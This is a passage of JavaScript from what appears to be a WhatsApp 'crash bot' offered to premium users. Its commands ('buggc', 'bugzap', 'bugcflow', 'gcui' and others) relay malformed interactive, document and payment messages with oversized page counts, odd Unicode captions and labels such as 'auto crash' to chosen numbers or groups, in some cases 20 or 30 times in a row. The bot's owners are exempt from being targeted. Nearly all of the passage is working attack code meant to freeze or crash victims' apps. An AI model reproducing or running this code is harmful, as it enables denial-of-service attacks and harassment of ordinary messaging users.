SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q=="
									eP.documentMessage.thumbnailHeight = 172
									eP.documentMessage.thumbnailWidth = 480
									await VxoZap.relayMessage(x, {
										viewOnceMessage: {
											message: {
												interactiveMessage: {
													header: eP,
													body: {
														text: ""
													},
													nativeFlowMessage: {
														buttons: [{
															name: "address_message",
															title: "oi",
															header: "fluxo no android; ",
															body: "xxx",
															buttonParamsJson: JSON.stringify({}),
														}],
														messageParamsJson: JSON.stringify({
															name: "address_message",
															title: "oi",
															header: "bruxel4s android; ",
															body: "xxx",
														})
													},
													contextInfo: {
														isForwarded: true,
														fromMe: false,
														participant: "0@s.whatsapp.net",
														remoteJid: m.chat,
														quotedMessage: {
															documentMessage: {
																url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
																mimetype: "application/pdf",
																fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
																fileLength: null,
																pageCount: 99999999999999,
																contactVcard: true,
																caption: "͡\uD807\uDC35",
																mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
																fileName: "> \uD83D\uDE94 | bruxel4s auto crash; ",
																fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
																directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
																mediaKeyTimestamp: "1714145232",
																thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
																thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
																thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
																jpegThumbnail: TheZhiro,
																thumbnailHeight: 172,
																thumbnailWidth: 480,
															}
														},
														externalAdReply: {
															title: "> BRU͢XiiN CLiE͢NT!",
															mediaType: "VIDEO",
															sourceUrl: "https://chat.whatsapp.com/JG5DINh26Pd3RiU9a9urtR",
														},
														forwardedNewsletterMessageInfo: {
															newsletterJid: "120363298524333143@newsletter",
															serverMessageId: 1,
															newsletterName: "\uD835\uDD87 \uD835\uDD97 \uD835\uDD9A \uD835\uDD9D \uD835\uDD8A \uD835\uDD91 \uD835\uDD86 \uD835\uDD98\u2003\u2003\u263F" + bugpdf + bugpdf,
														}
													}
												}
											}
										}
									}, {})
									eR.documentMessage.url = "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true"
									eR.documentMessage.mimetype = "application/pdf"
									eR.documentMessage.fileSha256 = "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8="
									eR.documentMessage.fileLength = null
									eR.documentMessage.pageCount = 99999999999999
									eR.documentMessage.contactVcard = true
									eR.documentMessage.caption = "͡\uD807\uDC35"
									eR.documentMessage.mediaKey = "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg="
									eR.documentMessage.fileName = "! fluxo auto crash; "
									eR.documentMessage.fileEncSha256 = "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k="
									eR.documentMessage.directPath = "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0"
									eR.documentMessage.mediaKeyTimestamp = "1714145232"
									eR.documentMessage.thumbnailDirectPath = "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0"
									eR.documentMessage.thumbnailSha256 = "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg="
									eR.documentMessage.thumbnailEncSha256 = "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM="
									eR.documentMessage.jpegThumbnail = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q=="
									eR.documentMessage.thumbnailHeight = 172
									eR.documentMessage.thumbnailWidth = 480
									await VxoZap.relayMessage(x, {
										viewOnceMessage: {
											message: {
												interactiveMessage: {
													header: eR,
													body: {
														text: ""
													},
													nativeFlowMessage: {
														buttons: [{
															name: "payment_method",
															title: "oi",
															header: "fluxo no android; ",
															body: "xxx",
														}],
														messageParamsJson: JSON.stringify({
															name: "address_message",
															title: "oi",
															header: "fluxo no android; ",
															body: "xxx",
														})
													}
												}
											}
										}
									}, {})
									await VxoZap.relayMessage(x, {
										requestPaymentMessage: {
											currencyCodeIso4217: "BRL",
											amount1000: "10000",
											noteMessage: {
												stickerMessage: {
													url: "https://mmg.whatsapp.net/v/t62.15575-24/40815542_298023669404967_8137288930028896106_n.enc?ccb=11-4&oh=01_AdRNuV2ysx9bYx3c0mksyhR-u9c5BG7-b3x1eCDYbFA65w&oe=64EF511A&mms3=true",
													fileSha256: "00zdVwDOfk+RHOI9HVRRc43lHGjR8ZO8x7OdErfi4nI=",
													fileEncSha256: "6tOTA5Tw72yHYqOl5pWFJcsbnhzwurpR+H4g6dG6SMA=",
													mediaKey: "+7Meau1x8pPYraSCKEm6UpL2vUwFaD2WLVpzAVdOmK0=",
													mimetype: "image/webp",
													height: 64,
													width: 64,
													directPath: "/v/t62.15575-24/40815542_298023669404967_8137288930028896106_n.enc?ccb=11-4&oh=01_AdRNuV2ysx9bYx3c0mksyhR-u9c5BG7-b3x1eCDYbFA65w&oe=64EF511A",
													mediaKeyTimestamp: "1690753283",
													isAnimated: false,
													stickerSentTs: "1690927831000",
													isAvatar: false,
													contextInfo: {
														isForwarded: true,
														fromMe: false,
														participant: "0@s.whatsapp.net",
														remoteJid: m.chat,
														quotedMessage: {
															documentMessage: {
																url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
																mimetype: "application/pdf",
																fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
																fileLength: null,
																pageCount: 99999999999999,
																contactVcard: true,
																caption: "͡\uD807\uDC35",
																mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
																fileName: "> \uD83D\uDE94 | bruxel4s auto crash; ",
																fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
																directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
																mediaKeyTimestamp: "1714145232",
																thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
																thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
																thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
																jpegThumbnail: TheZhiro,
																thumbnailHeight: 172,
																thumbnailWidth: 480,
															}
														},
														externalAdReply: {
															title: "> BRU͢XiiN CLiE͢NT!",
															mediaType: "VIDEO",
															sourceUrl: "https://chat.whatsapp.com/JG5DINh26Pd3RiU9a9urtR",
														},
														forwardedNewsletterMessageInfo: {
															newsletterJid: "120363298524333143@newsletter",
															serverMessageId: 1,
															newsletterName: "\uD835\uDD87 \uD835\uDD97 \uD835\uDD9A \uD835\uDD9D \uD835\uDD8A \uD835\uDD91 \uD835\uDD86 \uD835\uDD98\u2003\u2003\u263F" + bugpdf + bugpdf,
														}
													}
												}
											},
											expiryTimestamp: "0",
											amount: {
												value: "10000",
												offset: 1000,
												currencyCode: "BRL",
											},
											background: {
												id: "99",
												fileLength: "199562",
												width: 150,
												height: 150,
												mimetype: "Foi u Bruxo",
												placeholderArgb: 2282670816,
												textArgb: 4100048132,
												subtextArgb: 2940630892,
											}
										}
									}, {})
									await sleep(2000)
								} catch (error) {
									console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
								}
							}
						} else {
							failed.push(x)
						}
					}
					if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" ") + "\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length == 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length == 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					}
				} else if (db.data.settings[botNumber].autoButton) {
					for (const x of listgroup) {
						sections.push({
							"title": x.subject,
							"id": `${prefix + command} ${x.id}`
						})
					}
					VxoZap.sendButtons(m.chat, {
						"body": "LIST GROUP",
						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						sections
					}, {
						quoted: Zets
					})
				} else {
					zreply(`Example : ${prefix + command} 120###@g.us`)
				}
			}
			break
			case "buggc": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				const sections = []
				const listgroup = await VxoZap.getAllGroups(true)
				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
					zreply(mess.bugrespon)
					for (let j = 0; j < 30; j++) {
						try {
							await caltx(text)
						} catch (error) {
							console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
						}
					}
					zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜")
				} else if (input.length > 0) {
					const failed = []
					await zreply(mess.bugrespon)
					for (const x of input) {
						if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
							for (let j = 0; j < 30; j++) {
								try {
									await caltx(x)
								} catch (error) {
									console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
								}
							}
						} else {
							failed.push(x)
						}
					}
					if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" ") + "\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length == 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length == 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					}
				} else if (db.data.settings[botNumber].autoButton) {
					for (const x of listgroup) {
						sections.push({
							"title": x.subject,
							"id": `${prefix + command} ${x.id}`
						})
					}
					VxoZap.sendButtons(m.chat, {
						"body": "LIST GROUP",
						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
						sections
					}, {
						quoted: Zets
					})
				} else {
					zreply(`Example : ${prefix + command} 120###@g.us`)
				}
			}
			break
			case "bugzet": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				const sections = []
				const listgroup = await VxoZap.getAllGroups(true)
				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
					zreply(mess.bugrespon)
					for (let j = 0; j < 1; j++) {
						try {
							await ZnXIvS(text, Ptcp = false)
						} catch (error) {
							console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
						}
					}
					zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜")
				} else if (input.length > 0) {
					const failed = []
					await zreply(mess.bugrespon)
					for (const x of input) {
						if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
							for (let j = 0; j < 1; j++) {
								try {
									await ZnXIvS(X, Ptcp = false)
								} catch (error) {
									console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
								}
							}
						} else {
							failed.push(x)
						}
					}
					if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" ") + "\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length == 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length == 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					}
				} else if (db.data.settings[botNumber].autoButton) {
					for (const x of listgroup) {
						sections.push({
							"title": x.subject,
							"id": `${prefix + command} ${x.id}`
						})
					}
					VxoZap.sendButtons(m.chat, {
						"body": "LIST GROUP",
						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
						sections
					}, {
						quoted: Zets
					})
				} else {
					zreply(`Example : ${prefix + command} 120###@g.us`)
				}
			}
			break
			case "bugzap": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				const sections = []
				const listgroup = await VxoZap.getAllGroups(true)
				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
					zreply(mess.bugrespon)
					for (let j = 0; j < 1; j++) {
						try {
							await ClPmNull(text, null, GetsuZo, cct = false, ptcp = false)
							await ClPm(text, GetsuZo, cct = false, ptcp = false)
							await ClPm(text, GetsuZo, cct = false, ptcp = false)
						} catch (error) {
							console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
						}
					}
					zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜")
				} else if (input.length > 0) {
					const failed = []
					await zreply(mess.bugrespon)
					for (const x of input) {
						if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
							for (let j = 0; j < 1; j++) {
								try {
									await ClPmNull(X, null, GetsuZo, cct = false, ptcp = false)
									await ClPm(X, GetsuZo, cct = false, ptcp = false)
									await ClPm(X, GetsuZo, cct = false, ptcp = false)
								} catch (error) {
									console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
								}
							}
						} else {
							failed.push(x)
						}
					}
					if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" ") + "\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length == 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length == 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					}
				} else if (db.data.settings[botNumber].autoButton) {
					for (const x of listgroup) {
						sections.push({
							"title": x.subject,
							"id": `${prefix + command} ${x.id}`
						})
					}
					VxoZap.sendButtons(m.chat, {
						"body": "LIST GROUP",
						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
						sections
					}, {
						quoted: Zets
					})
				} else {
					zreply(`Example : ${prefix + command} 120###@g.us`)
				}
			}
			break
			case "bugcflow": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				const sections = []
				const listgroup = await VxoZap.getAllGroups(true)
				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
					zreply(mess.bugrespon)
					for (let i = 0; i < 1; i++) {
						await GlX(text, Ptcp = false)
						await StuckNull(text, GetsuZo, Ptcp = false)
					}
					for (let i = 0; i < 20; i++) {
						await TrashSystem(text, GetsuZo, Ptcp = false)
					}
					for (let i = 0; i < 1; i++) {
						await ClPm(text, GetsuZo, cct = false, ptcp = false)
						await InVisiXz(text, GetsuZo, cct = false, ptcp = false)
					}
					zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜")
				} else if (input.length > 0) {
					const failed = []
					await zreply(mess.bugrespon)
					for (const x of input) {
						if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
							for (let i = 0; i < 1; i++) {
								await GlX(X, Ptcp = false)
								await StuckNull(X, GetsuZo, Ptcp = false)
							}
							for (let i = 0; i < 20; i++) {
								await TrashSystem(X, GetsuZo, Ptcp = false)
							}
							for (let i = 0; i < 1; i++) {
								await ClPm(X, GetsuZo, cct = false, ptcp = false)
								await InVisiXz(X, GetsuZo, cct = false, ptcp = false)
							}
						} else {
							failed.push(x)
						}
					}
					if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" ") + "\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length == 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length == 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					}
				} else if (db.data.settings[botNumber].autoButton) {
					for (const x of listgroup) {
						sections.push({
							"title": x.subject,
							"id": `${prefix + command} ${x.id}`
						})
					}
					VxoZap.sendButtons(m.chat, {
						"body": "LIST GROUP",
						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
						sections
					}, {
						quoted: Zets
					})
				} else {
					zreply(`Example : ${prefix + command} 120###@g.us`)
				}
			}
			break
			case "bugoflow": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				const sections = []
				const listgroup = await VxoZap.getAllGroups(true)
				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
					zreply(mess.bugrespon)
					for (let i = 0; i < 1; i++) {
						await GlX(text, Ptcp = false)
					}
					for (let i = 0; i < 20; i++) {
						await TrashSystem(text, GetsuZo, Ptcp = false)
					}
					zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜")
				} else if (input.length > 0) {
					const failed = []
					await zreply(mess.bugrespon)
					for (const x of input) {
						if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
							for (let i = 0; i < 1; i++) {
								await GlX(X, Ptcp = false)
							}
							for (let i = 0; i < 20; i++) {
								await TrashSystem(X, GetsuZo, Ptcp = false)
							}
						} else {
							failed.push(x)
						}
					}
					if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" ") + "\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length == 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length == 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					}
				} else if (db.data.settings[botNumber].autoButton) {
					for (const x of listgroup) {
						sections.push({
							"title": x.subject,
							"id": `${prefix + command} ${x.id}`
						})
					}
					VxoZap.sendButtons(m.chat, {
						"body": "LIST GROUP",
						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
						sections
					}, {
						quoted: Zets
					})
				} else {
					zreply(`Example : ${prefix + command} 120###@g.us`)
				}
			}
			break
			case "gcui": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				const sections = []
				const listgroup = await VxoZap.getAllGroups(true)
				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
					zreply(mess.bugrespon)
					for (let i = 0; i < 6; i++) {
						await CrashUi(text, null, GetsuZo, cct = false, ptcp = false)
					}
					for (let i = 0; i < 1; i++) {
						await ClPm(text, GetsuZo, cct = false, ptcp = false)
					}
					zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜")
				} else if (input.length > 0) {
					const failed = []
					await zreply(mess.bugrespon)
					for (const x of input) {
						if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
							for (let i = 0; i < 6; i++) {
								await CrashUi(X, null, GetsuZo, cct = false, ptcp = false)
							}
							for (let i = 0; i < 1; i++) {
								await ClPm(X, nick.sss, GetsuZo, cct = false, ptcp = false)
							}
						} else {
							failed.push(x)
						}
					}
					if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length > 0) {
